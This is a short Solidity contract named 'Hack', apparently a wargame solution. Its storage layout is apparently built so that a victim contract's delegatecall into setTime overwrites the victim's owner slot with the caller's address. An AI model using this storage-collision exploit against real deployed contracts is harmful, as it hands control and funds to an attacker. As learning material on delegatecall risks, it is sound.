//SPDX-License-Identifier:MIT;

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hack{
    uint n;
    uint x;
    address public owner;

    function setTime(uint time) public {
        owner = msg.sender;
    }
}